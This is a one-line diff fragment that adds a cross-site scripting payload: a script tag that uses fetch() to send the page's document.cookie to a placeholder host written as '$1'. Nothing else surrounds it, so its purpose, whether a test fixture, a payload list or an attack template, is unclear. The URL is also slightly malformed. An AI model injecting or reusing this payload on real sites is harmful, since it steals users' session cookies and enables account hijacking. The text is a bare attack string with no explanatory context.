@@ -1,0 +1,1 @@
+<script>fetch(\"https://$1//.session=\"+document.cookie)</script>"
